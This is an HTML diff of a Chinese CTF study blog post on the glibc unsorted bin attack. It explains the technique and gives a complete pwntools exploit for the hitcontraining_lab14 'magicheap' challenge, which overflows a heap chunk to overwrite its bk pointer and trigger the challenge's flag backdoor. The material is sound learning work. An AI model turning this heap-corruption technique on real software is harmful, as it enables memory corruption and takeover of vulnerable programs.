@@ -162,119 +162,170 @@
 
             <div class="main">
                 <div class="container">
-                    <div class="post-wrap tags">
+                    <article class="post-wrap">
+                        <header class="post-header">
+                            <h1 class="post-title">
+                                unsorted bin attack
+                            </h1>
+                            
+                                <!--en-->
+                                <div class="post-meta en">
+                                    Author:
+                                    <a itemprop="author" rel="author" href="/">
+                                        lemon的自留地～
+                                    </a>
+                                    <span class="post-time">
+                                Date: <a href="#">2020-09-15</a>
+                            </span>
+                                    <span class="post-readtime">Reading Time:<a
+                                    href="#">1.6
+                                    mins</a></span>
+                                    <span class="post-words">words:<a href="#">356</a></span>
+                                    
+                                            Views:
+                                            <span data-hk-page="current"> - </span>
+                                            
+                                </div>
+                                
+                        </header>
                         
-                            <a href="https://l3mon629.github.io/tag/MbNBHUbMa/">
-                                <p class="post-title">
-                                    <i class="fa fa-tags" aria-hidden="true"> house系列</i>
-                                </p>
-                            </a>
+                        <div class="post-content">
+                            <h2 id="简单说明">简单说明</h2>
+<blockquote>
+<p>基本来源<br>
+当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。<br>
+释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。<br>
+当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。</p>
+</blockquote>
+<blockquote>
+<p>利用方法：<br>
+改unsorted bin 的bk为target-0x10</p>
+</blockquote>
+<blockquote>
+<p>实现效果：<br>
+将target改为一个很大的数值</p>
+</blockquote>
+<blockquote>
+<p>利用场景：<br>
+修改循环的次数来使得程序可以执行多次循环。<br>
+修改 heap 中的 global_max_fast 来使得更大的 chunk 可以被视为 fast bin。<br>
+改_IO_list_all来伪造_IO_FILE进行攻击。</p>
+</blockquote>
+<h2 id="hitcontraining_lab14">hitcontraining_lab14</h2>
+<p>题目的edit功能可以改size，实现一个强力的堆溢出，同时题目存在后门，只要改一个bss段的变量大于即可cat flag<br>
+思路很简单，堆溢出打掉unsorted bin的bk，连libc都不用泄漏<br>
+exp:</p>
+<pre><code class="language-python">from pwn import *
+
+p = process('./magicheap')
+
+def add(size,content):
+    p.sendlineafter('Your choice :','1')
+    p.sendlineafter('Size of Heap :',str(size))
+    p.sendafter('Content of heap:',content)
+
+def edit(index,size,content):
+    p.sendlineafter('Your choice :','2')
+    p.sendlineafter('Index :',str(index))
+    p.sendlineafter('Size of Heap :',str(size))
+    p.sendafter('Content of heap :',content)
+
+def delete(index):
+    p.sendlineafter('Your choice :','3')
+    p.sendlineafter('Index :',str(index))
+
+
+add(0x10,'aaaa')
+add(0x90,'aaaa')
+add(0x10,'protect')
+context.log_level = 'debug'
+target = 0x6020C0
+delete(1)
+payload = p64(0) * 3 + p64(0xa1) + p64(0) + p64(target-0x10)
+edit(0,0x40,payload)
+add(0x90,'a')
+p.recv()
+p.send('4869')
+
+p.interactive()
+</code></pre>
+
+                        </div>
+                        
+                            <div class="post-toc">
+                                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E7%AE%80%E5%8D%95%E8%AF%B4%E6%98%8E">简单说明</a></li>
+<li><a href="#hitcontraining_lab14">hitcontraining_lab14</a></li>
+</ul>
+</li>
+</ul>
+
+                            </div>
                             
-                            <a href="https://l3mon629.github.io/tag/tc2bM4krw/">
-                                <p class="post-title">
-                                    <i class="fa fa-tags" aria-hidden="true"> heap</i>
-                                </p>
-                            </a>
-                            
-                            <a href="https://l3mon629.github.io/tag/8UT0h8tF6/">
-                                <p class="post-title">
-                                    <i class="fa fa-tags" aria-hidden="true"> 笔记</i>
-                                </p>
-                            </a>
-                            
-                            <a href="https://l3mon629.github.io/tag/C77a1Iu7Z/">
-                                <p class="post-title">
-                                    <i class="fa fa-tags" aria-hidden="true"> 操作系统</i>
-                                </p>
-                            </a>
-                            
-                            <a href="https://l3mon629.github.io/tag/MG-_OYcCp6/">
-                                <p class="post-title">
-                                    <i class="fa fa-tags" aria-hidden="true"> Linux内核阅读</i>
-                                </p>
-                            </a>
-                            
-                            <a href="https://l3mon629.github.io/tag/PyuFfi-Dl/">
-                                <p class="post-title">
-                                    <i class="fa fa-tags" aria-hidden="true"> buuctf</i>
-                                </p>
-                            </a>
-                            
-                            <a href="https://l3mon629.github.io/tag/QDD3DbQ78b/">
-                                <p class="post-title">
-                                    <i class="fa fa-tags" aria-hidden="true"> wp</i>
-                                </p>
-                            </a>
-                            
-                            <a href="https://l3mon629.github.io/tag/nF1H8dVWQ/">
-                                <p class="post-title">
-                                    <i class="fa fa-tags" aria-hidden="true"> 组合攻击</i>
-                                </p>
-                            </a>
-                            
-                            <a href="https://l3mon629.github.io/tag/Yg2BsmPyIU/">
-                                <p class="post-title">
-                                    <i class="fa fa-tags" aria-hidden="true"> format-string</i>
-                                </p>
-                            </a>
-                            
-                            <a href="https://l3mon629.github.io/tag/mizqxcXow6/">
-                                <p class="post-title">
-                                    <i class="fa fa-tags" aria-hidden="true"> unlink</i>
-                                </p>
-                            </a>
-                            
-                            <a href="https://l3mon629.github.io/tag/Q22QNSAxW/">
-                                <p class="post-title">
-                                    <i class="fa fa-tags" aria-hidden="true"> off-by-one</i>
-                                </p>
-                            </a>
-                            
-                            <a href="https://l3mon629.github.io/tag/mGjsDXVh8/">
-                                <p class="post-title">
-                                    <i class="fa fa-tags" aria-hidden="true"> PHP学习</i>
-                                </p>
-                            </a>
-                            
-                            <a href="https://l3mon629.github.io/tag/_z_SEOkSG/">
-                                <p class="post-title">
-                                    <i class="fa fa-tags" aria-hidden="true"> glibc</i>
-                                </p>
-                            </a>
-                            
-                            <a href="https://l3mon629.github.io/tag/uryU9whCl/">
-                                <p class="post-title">
-                                    <i class="fa fa-tags" aria-hidden="true"> ret2csu</i>
-                                </p>
-                            </a>
-                            
-                            <a href="https://l3mon629.github.io/tag/us84qNRgFI/">
-                                <p class="post-title">
-                                    <i class="fa fa-tags" aria-hidden="true"> rop</i>
-                                </p>
-                            </a>
-                            
-                            <a href="https://l3mon629.github.io/tag/LszkIW-Qj5/">
-                                <p class="post-title">
-                                    <i class="fa fa-tags" aria-hidden="true"> 栈溢出</i>
-                                </p>
-                            </a>
-                            
-                            <a href="https://l3mon629.github.io/tag/7Pk4hD0yHh/">
-                                <p class="post-title">
-                                    <i class="fa fa-tags" aria-hidden="true"> fastbin attack</i>
-                                </p>
-                            </a>
-                            
-                            <a href="https://l3mon629.github.io/tag/d85MadhBD/">
-                                <p class="post-title">
-                                    <i class="fa fa-tags" aria-hidden="true"> tcache-attach</i>
-                                </p>
-                            </a>
-                            
-                    </div>
+                                
+                                    
+                                        <!--en-->
+                                        <section class="post-copyright en">
+                                            <p class="copyright-item">
+                                                <span>Author:</span>
+                                                <span>lemon的自留地～</span>
+                                            </p>
+
+                                            <p class="copyright-item">
+                                                <span>Permalink:</span>
+                                                <span><a href="https://l3mon629.github.io/post/unsorted-bin-attack/">https://l3mon629.github.io/post/unsorted-bin-attack/</a></span>
+                                            </p>
+
+                                            <p class="copyright-item">
+                                                <span>License:</span>
+                                                <span>MIT License</span>
+                                            </p>
+                                        </section>
+                                        
+                                                
+                                                    
+                                                        <!-- Share-->
+                                                        <span style="margin-right:15px">
+                                                    <i class="post-share"></i>
+                                                    <span>Share:</span>
+                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://l3mon629.github.io/post/unsorted-bin-attack/"><i class="fa fa-qrcode"></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/unsorted-bin-attack/&sharesource=qzone&title=unsorted bin attack&pics=https://l3mon629.github.io/images/avatar.png?v=1600144143355&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/unsorted-bin-attack/&sharesource=weibo&title=unsorted bin attack + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1600144143355 "><i class="fa fa-weibo "></i></a>
+                                                        
+                                                                </span>
+                                                                <!--en-->
+                                                                <section class="post-tags en ">
+                                                                    <div>
+                                                                        <span>Tag(s):</span>
+                                                                        <span class="tag ">
+                        
+                                                            </span>
+                                                                    </div>
+                                                                    <div>
+                                                                        <a href="javascript:window.history.back();">back</a>
+                                                                        <span>&dot;</span>
+                                                                        <a href="#">home</a>
+                                                                    </div>
+                                                                </section>
+                                                                
+                                                                                <!---->
+                                                                                <section class="post-nav">
+                                                                                    
+                                                                                            
+                                                                                                <a class="next" rel="next" href="https://l3mon629.github.io/post/house-of-orange-xue-xi/">
+                                                                                                    house of orange学习
+                                                                                                </a>
+                                                                                                
+                                                                                </section>
+                    </article>
                 </div>
+                
+                                            
             </div>
+    </div>
+    </div>
     </div>
     
         <footer id="footer" class="footer">
@@ -337,5 +388,8 @@
                 </script>
         </div>
 </body>
+<script>
+    scroll();
+</script>
 
 </html>
